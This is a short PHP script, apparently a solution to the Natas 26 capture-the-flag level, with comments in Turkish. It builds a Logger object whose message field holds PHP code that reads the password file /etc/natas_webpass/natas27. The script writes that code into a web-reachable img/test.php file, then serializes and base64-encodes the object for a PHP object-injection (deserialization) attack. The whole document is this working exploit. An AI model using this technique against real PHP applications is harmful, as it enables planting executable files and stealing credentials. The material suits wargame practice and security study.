<?php 
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct(){
        
        $this->initMsg="TEST\n";
        // oluşturacağımız dosyanın içeriğine gömmek istediğimiz kod parçacığı
        // bize natas27 nin şifresini verir
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        //oluşturmak istediğimiz dosya ve dosya yolu
        $this->logFile = "/var/www/natas/natas26/img/test.php";
  
        // dosyayı oluşturan ve içine kodu ekleyen script
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }  
}

$logger = new Logger();
echo base64_encode(serialize($logger));

?>